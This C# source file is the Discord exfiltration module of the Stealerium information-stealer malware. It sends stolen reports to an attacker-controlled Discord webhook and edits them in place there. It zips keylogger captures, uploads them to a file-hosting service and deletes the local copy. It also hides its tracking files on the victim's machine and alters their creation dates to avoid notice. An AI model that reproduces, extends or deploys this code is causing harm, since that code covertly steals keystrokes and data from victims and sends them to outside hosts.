using System;
using System.Collections.Specialized;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using Newtonsoft.Json.Linq;
using Stealerium.Helpers;
using Stealerium.Modules.Implant;
using Stealerium.Target.System;

namespace Stealerium
{
    internal sealed class DiscordWebHook
    {
        private const int MaxKeylogs = 10;

        // Message id location
        private static readonly string LatestMessageIdLocation = Path.Combine(Paths.InitWorkDir(), "msgid.dat");

        // Keylogs history file
        private static readonly string KeylogsHistory = Path.Combine(Paths.InitWorkDir(), "history.dat");

        // Save latest message id to file
        public static void SetLatestMessageId(string id)
        {
            try
            {
                File.WriteAllText(LatestMessageIdLocation, id);
                Startup.SetFileCreationDate(LatestMessageIdLocation);
                Startup.HideFile(LatestMessageIdLocation);
            }
            catch (Exception ex)
            {
                Logging.Log("SaveID: \n" + ex);
            }
        }

        // Get latest message id from file
        public static string GetLatestMessageId()
        {
            return File.Exists(LatestMessageIdLocation) ? File.ReadAllText(LatestMessageIdLocation) : "-1";
        }

        private static string GetMessageId(string response)
        {
            var jObject = JObject.Parse(response);
            var id = jObject["id"].Value<string>();
            return id;
        }

        public static bool WebhookIsValid()
        {
            try
            {
                using (var client = new WebClient())
                {
                    var response = client.DownloadString(
                        Config.Webhook
                    );
                    return response.StartsWith("{\"type\": 1");
                }
            }
            catch (Exception error)
            {
                Logging.Log("Discord >> Invalid Webhook:\n" + error);
            }

            return false;
        }

        /// <summary>
        ///     Send message to discord channel
        /// </summary>
        /// <param name="text">Message text</param>
        public static string SendMessage(string text)
        {
            try
            {
                var discordValues = new NameValueCollection();

                using (var client = new WebClient())
                {
                    discordValues.Add("username", Config.Username);
                    discordValues.Add("avatar_url", Config.Avatar);
                    discordValues.Add("content", text);
                    var response = client.UploadValues(Config.Webhook + "?wait=true", discordValues);
                    return GetMessageId(Encoding.UTF8.GetString(response));
                }
            }
            catch (Exception error)
            {
                Logging.Log("Discord >> SendMessage exception:\n" + error);
            }

            return "0";
        }

        /// <summary>
        ///     Edit message text in discord channel
        /// </summary>
        /// <param name="text">New text</param>
        /// <param name="id">Message ID</param>
        public static void EditMessage(string text, string id)
        {
            try
            {
                var discordValues = new NameValueCollection();

                using (var client = new WebClient())
                {
                    discordValues.Add("username", Config.Username);
                    discordValues.Add("avatar_url", Config.Avatar);
                    discordValues.Add("content", text);
                    client.UploadValues(Config.Webhook + "/messages/" + id, "PATCH", discordValues);
                }
            }
            catch
            {
                // ignored
            }
        }


        /// <summary>
        ///     Upload keylogs to anonfile
        /// </summary>
        private static void UploadKeylogs()
        {
            var log = Path.Combine(Paths.InitWorkDir(), "logs");
            if (!Directory.Exists(log)) return;
            var filename = DateTime.Now.ToString("yyyy-MM-dd_h.mm.ss");
            var archive = Filemanager.CreateArchive(log, false);
            File.Move(archive, filename + ".zip");
            var url = GofileFileService.UploadFile(filename + ".zip");
            File.Delete(filename + ".zip");
            File.AppendAllText(KeylogsHistory, "\t\t\t\t\t\t\t- " +
                                               $"[{filename.Replace("_", " ").Replace(".", ":")}]({url})\n");
            Startup.HideFile(KeylogsHistory);
        }

        /// <summary>
        ///     Get string with keylogs history
        /// </summary>
        /// <returns></returns>
        private static string GetKeylogsHistory()
        {
            if (!File.Exists(KeylogsHistory))
                return "";

            var logs = File.ReadAllLines(KeylogsHistory)
                .Reverse().Take(MaxKeylogs).Reverse().ToList();
            var len = logs.Count == 10 ? $"({logs.Count} - MAX)" : $"({logs.Count})";
            var data = string.Join("\n", logs);
            return $"\n\n  ⌨️ *Keylogger {len}:*\n" + data;
        }
        public static void SendReport(string msg)
        {
            var last = GetLatestMessageId();
            if (last != "-1")
                EditMessage(msg, last);
            else
                SetLatestMessageId(SendMessage(msg));
        }
    }
}